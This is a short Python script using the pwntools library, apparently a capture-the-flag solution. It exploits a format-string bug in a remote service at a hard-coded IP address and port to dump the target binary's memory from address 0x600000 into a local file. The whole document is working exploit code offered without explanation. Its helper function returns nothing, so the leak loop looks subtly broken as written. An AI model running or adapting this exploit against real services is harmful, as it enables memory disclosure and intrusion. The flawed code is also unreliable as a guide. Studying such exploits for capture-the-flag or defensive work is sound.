from pwn import *

p=remote('47.75.182.113',9999)
def ru(x):
    p.recvuntil(x)
def se(x):
    p.sendline(x)
def leak(addr):
    payload="ab%7$scd"+p64(addr)
    se(payload)
    ru('ab')
    data=ru('cd')[:-2]
    if len(data)==0:
        return '\x00'
    return data

addr=0x600000
for i in range(0x1000):
    f=open("fmt","a+")
    data=leak(addr)
    f.write(data)
    addr+=len(data)
    f.close()
